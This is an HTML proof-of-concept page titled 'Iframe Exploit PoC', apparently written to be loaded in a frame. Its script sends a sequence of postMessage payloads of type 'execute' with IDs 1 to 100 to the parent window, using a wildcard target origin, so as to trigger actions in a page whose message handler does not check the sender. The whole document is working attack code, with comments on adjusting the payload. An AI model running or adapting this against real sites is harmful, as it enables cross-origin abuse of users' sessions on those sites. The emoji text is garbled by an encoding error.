<!DOCTYPE html>
<html>
<head>
  <title>Iframe Exploit PoC</title>
  <meta charset="UTF-8">
  <style>
    body { font-family: sans-serif; background: #111; color: #0f0; padding: 20px; }
  </style>
</head>
<body>
  <h1>ðŸ“¤ Sending payload to parent window...</h1>
  <p>Check devtools console.</p>

  <script>
    let currentID = 1;
    const MAX_ID = 100; // Adjust as needed

    const payload = (id) => ({
      type: "execute",
      id: id,
      // You can add more keys depending on expected structure
    });

    const interval = setInterval(() => {
      if (currentID > MAX_ID) {
        clearInterval(interval);
        console.log("âœ… Done sending all payloads.");
        return;
      }

      const msg = payload(currentID);
      console.log("ðŸ“¤ Sending payload with ID:", currentID);
      parent.postMessage(msg, "*"); // No need for a reply
      currentID++;
    }, 500); // 500ms delay to avoid flooding
  </script>
</body>
